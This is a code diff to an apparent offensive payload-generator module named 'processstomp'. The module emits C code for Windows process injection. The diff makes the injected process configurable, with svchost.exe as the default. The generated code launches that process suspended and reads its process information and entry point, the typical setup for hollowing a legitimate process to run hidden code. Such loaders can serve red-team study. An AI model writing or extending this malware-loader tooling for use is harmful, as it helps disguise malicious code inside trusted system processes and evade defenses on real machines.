@@ -1,6 +1,8 @@
 class processstomp:
     def __init__(self, arguments):
-        pass
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -41,7 +43,7 @@ int main()
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     NTSTATUS status;
     PROCESS_BASIC_INFORMATION pbi;
